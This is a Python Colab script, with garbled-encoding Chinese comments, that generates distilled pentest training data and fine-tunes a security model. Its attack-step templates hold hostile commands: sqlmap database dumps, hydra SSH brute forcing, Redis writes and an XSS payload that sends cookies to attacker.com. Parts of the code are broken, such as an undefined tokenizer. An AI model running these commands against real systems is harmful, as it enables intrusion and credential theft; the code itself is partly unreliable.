#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CyberSec 4B Model - Colab Training Script
=========================================
âœ… Colab T4/P100 å„ªåŒ–
âœ… Google Drive é›†æˆ
âœ… å®Œæ•´ç›£æ§å’Œæ¢å¾©

ä½¿ç”¨æ–¹æ³•:
from colab_train import main
main()
"""

import os
import sys
import json
import time
import logging
from datetime import datetime
from typing import Optional

# UTF-8 ç·¨ç¢¼
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Google Drive è¨­ç½®
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def setup_google_drive():
    """æ›è¼‰ Google Drive ä¸¦è¨­ç½®è·¯å¾‘"""
    from google.colab import drive
    import os

    print("ğŸ“‚ æ›è¼‰ Google Drive...")
    drive.mount('/content/drive')

    # è¨­ç½®é …ç›®è·¯å¾‘
    PROJECT_PATH = '/content/drive/MyDrive/Cybersecurity-4B-AI-Model'
    DATA_PATH = os.path.join(PROJECT_PATH, 'data')
    OUTPUT_PATH = os.path.join(PROJECT_PATH, 'outputs')

    os.makedirs(DATA_PATH, exist_ok=True)
    os.makedirs(OUTPUT_PATH, exist_ok=True)

    # å‰µå»ºç¬¦è™Ÿéˆæ¥
    if not os.path.exists('data'):
        os.symlink(os.path.join(PROJECT_PATH, 'data'), 'data')

    print(f"âœ… é …ç›®è·¯å¾‘: {PROJECT_PATH}")
    print(f"âœ… æ•¸æ“šè·¯å¾‘: {DATA_PATH}")
    print(f"âœ… è¼¸å‡ºè·¯å¾‘: {OUTPUT_PATH}")

    return PROJECT_PATH, DATA_PATH, OUTPUT_PATH

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ä¾è³´å®‰è£
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def install_dependencies():
    """å®‰è£å¿…è¦çš„ä¾è³´"""
    import subprocess
    import sys

    print("ğŸ“¦ å®‰è£ä¾è³´...")

    packages = [
        'transformers>=4.40.0',
        'torch>=2.1.0',
        'accelerate>=0.28.0',
        'peft>=0.10.0',
        'bitsandbytes>=0.41.0',
        'trl>=0.8.0',
        'scikit-learn',
        'tqdm',
    ]

    for pkg in packages:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-q', pkg])

    print("âœ… ä¾è³´å®‰è£å®Œæˆ")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# GPU è¨ºæ–·
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def diagnose_gpu():
    """è¨ºæ–· GPU ç‹€æ…‹"""
    import torch

    print("\n" + "="*60)
    print("ğŸ” GPU è¨ºæ–·")
    print("="*60)

    if torch.cuda.is_available():
        gpu_name = torch.cuda.get_device_name(0)
        gpu_mem = torch.cuda.get_device_properties(0).total_memory / (1024**3)
        gpu_mem_alloc = torch.cuda.memory_allocated() / (1024**3)
        gpu_mem_reserved = torch.cuda.memory_reserved() / (1024**3)

        print(f"\nâœ… GPU: {gpu_name}")
        print(f"   ç¸½è¨˜æ†¶é«”: {gpu_mem:.2f} GB")
        print(f"   å·²åˆ†é…: {gpu_mem_alloc:.2f} GB")
        print(f"   å·²ä¿ç•™: {gpu_mem_reserved:.2f} GB")
        print(f"   å¯ç”¨: {gpu_mem - gpu_mem_reserved:.2f} GB")

        # è¨ˆç®—å¯ç”¨ batch size
        if gpu_mem >= 14:  # T4/P100
            batch_size = 4
            gradient_accumulation = 4
        elif gpu_mem >= 10:
            batch_size = 2
            gradient_accumulation = 8
        else:
            batch_size = 1
            gradient_accumulation = 16

        print(f"\nğŸ“Š æ¨è–¦é…ç½®:")
        print(f"   Batch Size: {batch_size}")
        print(f"   Gradient Accumulation: {gradient_accumulation}")
        print(f"   Effective Batch: {batch_size * gradient_accumulation}")

        return True, batch_size, gradient_accumulation
    else:
        print("\nâš ï¸ æœªæª¢æ¸¬åˆ° GPUï¼Œä½¿ç”¨ CPU (æœƒå¾ˆæ…¢)")
        return False, 1, 64

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# æ•¸æ“šç”Ÿæˆ (Multi-Teacher Distillation)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

import torch
from transformers import AutoModelForCausalLM, AutoTokenizer
import gc

def generate_tinyllm_data(
    output_file: str = "data/distilled_tinyllm.jsonl",
    num_samples: int = 2000,
    model_name: str = "Qwen/Qwen2.5-7B-Instruct"
):
    """ç”Ÿæˆ TinyLLM æ ¼å¼çš„è¨“ç·´æ•¸æ“š"""
    import json
    import random
    from tqdm import tqdm

    print(f"\nğŸ“ ç”Ÿæˆ TinyLLM æ•¸æ“š...")
    print(f"   æ¨¡å‹: {model_name}")
    print(f"   æ¨£æœ¬æ•¸: {num_samples}")

    # å ´æ™¯æ¨¡æ¿
    scenarios = [
        {"scenario": "SMBv1 enabled on Windows Server 2016", "category": "scan"},
        {"scenario": "Web app has SQL injection on login form", "category": "sqli"},
        {"scenario": "XSS found on comment form", "category": "xss"},
        {"scenario": "Redis server accessible without auth", "category": "service"},
        {"scenario": "SSH weak password (root:toor)", "category": "creds"},
        {"scenario": "JWT token with weak secret", "category": "auth"},
        {"scenario": "Docker daemon exposed", "category": "service"},
        {"scenario": "Sudo version 1.8.31 vulnerable", "category": "priv-esc"},
        {"scenario": "Found /admin backup file", "category": "file-disclosure"},
        {"scenario": "MongoDB NoAuth on port 27017", "category": "service"},
    ]

    # æ”»æ“Šæ­¥é©Ÿæ¨¡æ¿
    step_templates = {
        "scan": [
            ("nmap -p 445 --script smb-vuln-ms17-010 {target}", "Check for MS17-010"),
            ("enum4linux -a {target}", "Enumerate SMB shares"),
            ("smbclient -L //{target}", "List SMB shares"),
        ],
        "sqli": [
            ("sqlmap -u '{url}' --dbs", "Enumerate databases"),
            ("sqlmap -u '{url}' -D {db} --tables", "Enumerate tables"),
            ("sqlmap -u '{url}' -D {db} -T {table} --dump", "Dump data"),
        ],
        "xss": [
            ("<script>alert(1)</script>", "Test basic XSS"),
            ("<img src=x onerror=alert(1)>", "Test event handler"),
            ("'><script>fetch('http://attacker.com?c='+document.cookie)</script>", "Exfiltrate cookie"),
        ],
        "service": [
            ("redis-cli -h {target} INFO", "Check Redis info"),
            ("redis-cli -h {target} CONFIG GET *", "Dump Redis config"),
            ("redis-cli -h {target} SET key 'pwned'", "Write data"),
        ],
        "creds": [
            ("ssh root@{target}", "SSH login attempt"),
            ("hydra -l root -P wordlist.txt ssh://{target}", "Brute force SSH"),
            ("mysql -h {target} -u root -p", "MySQL login attempt"),
        ],
        "auth": [
            ("python3 jwt_tool.py -t {token} -s secret", "Brute force JWT secret"),
            ("python3 -c 'import jwt; print(jwt.decode(token, "weak", algorithms=["HS256"]))'", "Decode JWT"),
        ],
        "priv-esc": [
            ("searchsploit sudo 1.8.31", "Find sudo exploit"),
            ("sudo -l", "Check sudo permissions"),
            ("python3 -c 'import pty; pty.spawn("/bin/bash")'", "Spawn TTY"),
        ],
        "file-disclosure": [
            ("curl {url}/admin/backups.sql", "Download backup"),
            ("curl {url}/phpinfo.php", "Check PHP info"),
            ("gzip -d backup.sql.gz", "Decompress backup"),
        ],
    }

    # è¼‰å…¥æ¨¡å‹
    print("\nğŸ”„ è¼‰å…¥æ¨¡å‹...")
    tokenizer = AutoTokenizer.from_pretrained(model_name, trust_remote_code=True)

    model = AutoModelForCausalLM.from_pretrained(
        model_name,
        torch_dtype=torch.float16,
        device_map="auto",
        trust_remote_code=True,
    )

    print(f"âœ… æ¨¡å‹è¼‰å…¥å®Œæˆ: {model_name}")

    # ç”Ÿæˆæ•¸æ“š
    data = []
    batch_size = 32

    for i in tqdm(range(0, num_samples, batch_size), desc="Generating"):
        batch = scenarios[i % len(scenarios):min(i+batch_size, len(scenarios))]

        for scenario in batch:
            cat = scenario["category"]

            # æ§‹é€ å°è©±
            messages = [
                {"role": "system", "content": "You are a professional penetration tester. Given a scenario, provide executable attack steps."},
                {"role": "user", "content": f"Scenario: {scenario['scenario']}\nWhat is the next experiment you would run?"},
            ]

            # ç”Ÿæˆå›æ‡‰
            text = tokenizer.apply_chat_template(
                messages,
                tokenize=False,
                add_generation_prompt=True
            )

            inputs = tokenizer(text, return_tensors="pt").to(model.device)

            with torch.no_grad():
                outputs = model.generate(
                    **inputs,
                    max_new_tokens=512,
                    temperature=0.7,
                    top_p=0.9,
                    do_sample=True,
                )

            response = tokenizer.decode(outputs[0], skip_special_tokens=True)

            # TinyLLM æ ¼å¼
            sample = {
                "messages": messages + [{"role": "assistant", "content": response}],
                "category": cat,
                "scenario": scenario["scenario"],
                "steps": step_templates.get(cat, []),
            }

            data.append(sample)

        # æ¸…ç† GPU è¨˜æ†¶é«”
        del inputs, outputs
        torch.cuda.empty_cache()

    # ä¿å­˜
    with open(output_file, 'w', encoding='utf-8') as f:
        for item in data:
            f.write(json.dumps(item, ensure_ascii=False) + '\n')

    print(f"\nâœ… æ•¸æ“šå·²ä¿å­˜: {output_file}")
    print(f"   ç¸½æ¨£æœ¬æ•¸: {len(data)}")

    # å¸è¼‰æ¨¡å‹
    del model
    gc.collect()
    torch.cuda.empty_cache()

    return output_file

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# QLoRA Fine-tune (é‡å° 4B æ¨¡å‹å„ªåŒ–)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def train_with_qlora(
    data_file: str = "data/distilled_tinyllm.jsonl",
    output_dir: str = "outputs/cyber-4b-qlora",
    epochs: int = 3,
    learning_rate: float = 2e-4,
):
    """ä½¿ç”¨ QLoRA é€²è¡Œå¾®èª¿"""
    from peft import LoraConfig, get_peft_model, TaskType
    from transformers import TrainingArguments, Trainer, DataCollatorForSeq2Seq
    from datasets import Dataset
    import json

    print(f"\nğŸš€ é–‹å§‹ QLoRA è¨“ç·´...")
    print(f"   æ•¸æ“š: {data_file}")
    print(f"   è¼¸å‡º: {output_dir}")
    print(f"   Epochs: {epochs}")

    # è®€å–æ•¸æ“š
    with open(data_file, 'r', encoding='utf-8') as f:
        raw_data = [json.loads(line) for line in f]

    # è½‰æ›ç‚º dataset æ ¼å¼
    dataset_data = {
        "text": [
            tokenizer.apply_chat_template(
                item["messages"],
                tokenize=False,
            )
            for item in raw_data
        ]
    }

    dataset = Dataset.from_dict(dataset_data)

    # QLoRA é…ç½®
    lora_config = LoraConfig(
        task_type=TaskType.CAUSAL_LM,
        inference_mode=False,
        r=16,
        lora_alpha=32,
        lora_dropout=0.05,
        target_modules=["q_proj", "k_proj", "v_proj", "o_proj"],
    )

    # åŠ è¼‰åŸºç¤æ¨¡å‹
    model_name = "Qwen/Qwen2.5-7B-Instruct"
    model = AutoModelForCausalLM.from_pretrained(
        model_name,
        torch_dtype=torch.float16,
        device_map="auto",
    )

    model = get_peft_model(model, lora_config)
    model.print_trainable_parameters()

    # è¨“ç·´åƒæ•¸
    training_args = TrainingArguments(
        output_dir=output_dir,
        num_train_epochs=epochs,
        per_device_train_batch_size=4,
        gradient_accumulation_steps=4,
        learning_rate=learning_rate,
        logging_steps=10,
        save_strategy="epoch",
        save_total_limit=2,
        fp16=True,
        report_to="none",
        dataloader_pin_memory=False,
    )

    # Trainer
    trainer = Trainer(
        model=model,
        args=training_args,
        train_dataset=dataset,
        data_collator=DataCollatorForSeq2Seq(tokenizer),
    )

    # è¨“ç·´
    print("\nğŸ”¥ é–‹å§‹è¨“ç·´...")
    trainer.train()

    # ä¿å­˜
    model.save_pretrained(output_dir)
    tokenizer.save_pretrained(output_dir)

    print(f"\nâœ… æ¨¡å‹å·²ä¿å­˜: {output_dir}")

    return output_dir

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# RAG æ¨¡å¡Š (è¼•é‡ç‰ˆ)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class LightweightRAG:
    """è¼•é‡ç´š RAG - é©åˆ Colab"""

    def __init__(self, docs_path: str = "data/cve_docs"):
        import faiss
        from sentence_transformers import SentenceTransformer

        self.docs_path = docs_path
        self.embedding_model = None
        self.index = None
        self.documents = []

        # 4-bit é‡åŒ–åµŒå…¥æ¨¡å‹
        print("ğŸ“¦ è¼‰å…¥åµŒå…¥æ¨¡å‹ (4-bit)...")
        self.embedding_model = SentenceTransformer(
            "BAAI/bge-small-en-v1.5",
            device="cuda",
            model_kwargs={"torch_dtype": torch.float16},
        )
        print("âœ… åµŒå…¥æ¨¡å‹è¼‰å…¥å®Œæˆ")

    def add_documents(self, texts: list):
        """æ·»åŠ æ–‡æª”åˆ°å‘é‡åº«"""
        embeddings = self.embedding_model.encode(texts, show_progress_bar=True)

        if self.index is None:
            dimension = embeddings.shape[1]
            self.index = faiss.IndexFlatL2(dimension)

        self.index.add(embeddings)
        self.documents.extend(texts)

        print(f"âœ… å·²æ·»åŠ  {len(texts)} æ–‡æª”")

    def search(self, query: str, k: int = 3) -> list:
        """æœç´¢ç›¸é—œæ–‡æª”"""
        query_embedding = self.embedding_model.encode([query])

        distances, indices = self.index.search(query_embedding, k)

        results = []
        for i, idx in enumerate(indices[0]):
            if idx < len(self.documents):
                results.append({
                    "text": self.documents[idx],
                    "distance": distances[0][i],
                })

        return results

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ä¸»å‡½æ•¸
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def main():
    """ä¸»åŸ·è¡Œå‡½æ•¸"""
    print("="*60)
    print("ğŸ” CyberSec 4B Model - Colab Training")
    print("="*60)

    # 1. è¨­ç½® Drive
    PROJECT_PATH, DATA_PATH, OUTPUT_PATH = setup_google_drive()

    # 2. å®‰è£ä¾è³´
    install_dependencies()

    # 3. GPU è¨ºæ–·
    has_gpu, batch_size, grad_accum = diagnose_gpu()

    if not has_gpu:
        print("\nâš ï¸ è­¦å‘Š: æœªæª¢æ¸¬åˆ° GPUï¼Œè¨“ç·´æœƒéå¸¸æ…¢")
        print("å»ºè­°ä½¿ç”¨ Colab Pro æˆ–æœ¬åœ° GPU")

    # 4. ç”Ÿæˆæ•¸æ“š
    data_file = os.path.join(DATA_PATH, "distilled_tinyllm.jsonl")
    generate_tinyllm_data(
        output_file=data_file,
        num_samples=2000,
        model_name="Qwen/Qwen2.5-7B-Instruct"
    )

    # 5. QLoRA è¨“ç·´
    output_dir = os.path.join(OUTPUT_PATH, "cyber-4b-qlora")
    train_with_qlora(
        data_file=data_file,
        output_dir=output_dir,
        epochs=3,
    )

    # 6. æ¸¬è©¦
    print("\n" + "="*60)
    print("ğŸ‰ è¨“ç·´å®Œæˆ!")
    print("="*60)
    print(f"\nğŸ“ æ¨¡å‹ä½ç½®: {output_dir}")
    print(f"ğŸ“ æ•¸æ“šä½ç½®: {data_file}")
    print("\nä¸‹ä¸€æ­¥:")
    print("1. ä¸‹è¼‰æ¨¡å‹æ–‡ä»¶")
    print("2. åœ¨æœ¬åœ°æˆ–ã€ç”Ÿç”¢ç’°å¢ƒéƒ¨ç½²")
    print("3. ä½¿ç”¨ RAG æ¨¡å¡Šå¢å¼·æœ€æ–° CVE çŸ¥è­˜")

if __name__ == "__main__":
    main()
